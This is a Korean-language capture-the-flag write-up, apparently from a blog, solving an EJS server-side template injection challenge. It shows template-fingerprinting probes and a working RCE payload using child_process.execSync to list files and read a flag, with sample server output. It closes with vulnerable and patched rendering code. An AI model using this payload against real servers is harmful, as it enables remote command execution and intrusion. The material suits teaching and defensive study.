+++
title = "VulnABLE CTF [LUXORA] Write-up: SSTI 🥉 Bronze"
date = "2026-03-14"
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "SSTI", "Bronze", "Template Engine", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: SSTI 🥉 Bronze

## 🎯 챌린지 개요
- **카테고리**: Injection Layer (SSTI)
- **난이도**: 🥉 Bronze
- **타겟 경로**: `/ssti/bronze`
- **목표**: 템플릿 엔진(Template Engine)의 입력값 검증 부재를 악용하여 템플릿 문법을 주입하고, 서버에서 원격 코드 실행(RCE)을 달성하여 플래그를 탈취하라.

---

## 🕵️‍♂️ 1. 정보 수집 및 반응 분석 (Reconnaissance)

`/ssti/bronze` 페이지는 URL의 파라미터로 받은 이름을 화면에 그대로 렌더링해 주는 "환영 인사" 페이지입니다.

### 정상 요청 테스트
```http
GET /ssti/bronze?name=Alice
```

**[화면 출력]**
```html
<h1>Hello, Alice!</h1>
```

**[해커의 사고 과정]**
1. 내 입력값(`Alice`)이 화면에 즉시 반사(Reflect)된다. 
2. 단순한 Cross-Site Scripting (XSS) 취약점일 수도 있지만, 만약 백엔드에서 템플릿 엔진을 사용해 문자열을 치환하고 있다면 **Server-Side Template Injection (SSTI)**이 가능하다.
3. 템플릿 엔진마다 고유한 연산 문법(예: `{{7*7}}`, `${7*7}`)이 있다. 여러 가지 기호를 넣어 서버가 이를 어떻게 연산하는지 테스트(Fingerprinting) 해보자.

---

## 💥 2. 취약점 식별 및 엔진 핑거프린팅 (Vulnerability Identification)

### 📊 공격 흐름도 (Attack Flow)

```text
[ Attacker ] --(Input: {{7*7}})--> [ Web Server ]
                                   |-- Template Engine Evaluates
<-- Returns: 49 -------------------|
```


다양한 템플릿 엔진의 문법을 하나씩 입력해 봅니다. (Jinja2, Twig, EJS 등)

### 페이로드 전송 (수식 연산)
- 시도 1 (Jinja2/Twig): `GET /ssti/bronze?name={{7*7}}` ➔ 출력: `Hello, {{7*7}}!` (실패)
- 시도 2 (Spring/Freemarker): `GET /ssti/bronze?name=${7*7}` ➔ 출력: `Hello, ${7*7}!` (실패)
- 시도 3 (EJS/ERB): `GET /ssti/bronze?name=<%= 7*7 %>` ➔ 출력: `Hello, 49!` (성공!)

**[해석 및 결론]**
입력값 `<%= 7*7 %>` 이 서버 내부에서 계산되어 `49` 라는 숫자로 반환되었습니다. 이는 Node.js 환경에서 주로 쓰이는 **EJS (Embedded JavaScript)** 템플릿 엔진이 사용되고 있으며, SSTI 취약점이 확실히 존재함을 의미합니다.

---

## 🚀 3. 원격 코드 실행 (RCE) 및 익스플로잇 (Exploitation)

EJS 템플릿 엔진은 자바스크립트 실행 환경(Context)과 연결되어 있습니다. 즉, 템플릿 태그 `<% ... %>` 내부에서 Node.js의 강력한 글로벌 객체들에 접근할 수 있습니다.

### 💡 페이로드 설계 (명령어 실행)
Node.js에서 시스템 명령어를 실행하려면 `child_process` 모듈이 필요합니다. EJS 컨텍스트 안에서 이 모듈을 어떻게 불러올까요? `global` 객체나 `process` 객체를 활용합니다.

```javascript
// EJS 환경에서 OS 명령어 실행을 위한 자바스크립트 코드
global.process.mainModule.require('child_process').execSync('ls -la').toString()
```

이 코드를 EJS 출력 태그 `<%= ... %>` 로 감싸서 전송합니다.

### 페이로드 조립 및 전송
URL에 넣기 위해 특수문자(`=`, ` `, `'` 등)를 URL 인코딩해야 합니다.

```http
GET /ssti/bronze?name=<%25%3D%20global.process.mainModule.require('child_process').execSync('ls%20-la').toString()%20%25>
```
*(실제 전달되는 값: `<%= global.process.mainModule.require('child_process').execSync('ls -la').toString() %>`)*

### 🔍 서버의 응답 (디렉터리 탐색)
서버의 터미널에서 실행된 `ls -la` 결과가 웹 브라우저 화면에 뿌려집니다!
```text
Hello, 
total 32
drwxr-xr-x 1 root root 4096 Oct 10 12:00 .
drwxr-xr-x 1 root root 4096 Oct 10 11:50 ..
-rw-r--r-- 1 root root   34 Oct 10 12:00 flag_ssti_bronze.txt
...
```

파일 목록에 `flag_ssti_bronze.txt` 가 보입니다. 이제 `ls -la` 부분을 `cat flag_ssti_bronze.txt` 로 바꾸어 다시 보냅니다.

```http
GET /ssti/bronze?name=<%25%3D%20global.process.mainModule.require('child_process').execSync('cat%20flag_ssti_bronze.txt').toString()%20%25>
```

---

## 🚩 4. 롸잇업 결론 및 플래그

템플릿 엔진의 잘못된 렌더링 방식을 찌르는 단 한 번의 공격으로, 데이터베이스를 넘어 서버의 OS 쉘을 완전히 장악하는 원격 코드 실행(RCE)을 달성했습니다.

**🔥 획득한 플래그:**
`FLAG{SSTI_🥉_EJS_BASIC_F7A1C2}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)
이 취약점은 개발자가 템플릿을 렌더링할 때, 데이터를 '변수'로 넘기지 않고 템플릿 파일의 소스코드 자체를 동적으로 조립(문자열 결합)해 버렸기 때문에 발생했습니다.

* **취약한 렌더링 코드**
```javascript
// 입력값이 템플릿 코드 그 자체로 평가되어버림
const template = "<h1>Hello, " + req.query.name + "!</h1>";
const html = ejs.render(template);
```

* **안전한 패치 코드 (데이터 바인딩)**
템플릿 파일(소스코드)과 전달할 데이터(Context)를 명확히 분리해야 합니다.
```javascript
// 템플릿 문자열에는 변수명만 남기고, 실제 값은 두 번째 인자로 넘김
const template = "<h1>Hello, <%= username %>!</h1>";
const html = ejs.render(template, { username: req.query.name });
```
이렇게 하면 입력값에 `<%= ... %>` 가 들어오더라도, EJS 엔진은 이를 코드가 아닌 단순한 문자열 데이터로 취급하여 화면에 `<%= ... %>` 모양 그대로 안전하게 출력합니다 (XSS 방어를 위한 HTML 인코딩도 자동 수행됨).